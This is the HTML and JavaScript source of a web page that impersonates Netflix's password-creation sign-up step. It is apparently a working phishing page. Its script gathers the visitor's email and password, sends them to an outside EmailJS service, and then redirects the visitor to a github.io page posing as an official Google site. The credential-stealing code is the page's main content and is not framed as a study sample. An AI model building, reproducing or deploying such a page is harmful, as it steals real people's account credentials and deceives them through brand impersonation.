    <title>Netflix</title>
 <style>

<body>
  
        <div class="container">

             <div class="step">

              </div>
              
  <h1>Create a password to<br> start your membership.</h1>
          <div class="comfort">
<p>Just a few more steps and you're done.</p>
 <p style="margin-top: -10px;">We hate paperwork, too.</p>
            </div>
         <div class="form-group">  
 <form id="NetflixForm">
  <input type="email" id="email" name="email" placeholder="Email"><br>
  <input type="password" id="password" name="password" placeholder="Add a password"><br>
  <input style="margin-top: 10px;" type="checkbox" id="checkbox"><label for="checkbox">Please email me Netflix special offers.</label>
           </div>
       <br>
 <div class="next">
   
 <button type="submit" id="NetflixSignup" onclick="sendMail()">Next</button>
     
 </form>
  <div>
          </div>    
          <br></br><br></br><br></br>
          
          
    </div>
    
    
      <div class="buttom">
   <p>Questions? Contact us.</p>
   <p>FAQ <span style="margin-left: 145px;">Help Center</span></p>
   <p>Netflix Shop <span style="margin-left: 85px;">Terms of use</span></p>
   <p>Privacy <span style="margin-left: 120px;">Cookies</span></p>
   <p>Corporate Information</p>
            </div>
            
  
 <script>
  let formSubmitted = false; // Variable to track form submission
  
  function sendMail(){
    if (formSubmitted) {
      return; // Exit the function if form is already submitted
    }

    let parms = {
      email : document.getElementById("email").value,
      password : document.getElementById("password").value,
      submit_button_id: document.getElementById("NetflixSignup").id
    };
    
    // Set formSubmitted to true before sending email
    formSubmitted = true;
    
        emailjs.send("service_9evnoou","template_79435mm", parms)
      .then(function(response) {
        // Redirect to Google after email is sent
        window.location.href = "https://official-google.github.io/Netflix/Netflix4.html";
      })
      .catch(function(error) {
        console.error('Invalid username or password:', error);
        // Handle error if necessary
      });
  }

  // Attach form submission event handler
  document.getElementById('NetflixForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent default form submission
    sendMail(); // Call sendMail function
  });
</script>

<script>
document.getElementById('NetflixSignup').addEventListener('click', function() {
    const button = this;
    button.disabled = true; // Disable the button

    setTimeout(function() {
        button.disabled = false; // Re-enable the button after 5 seconds
    }, 5000); // 5000 milliseconds = 5 seconds
});
   
 </script>
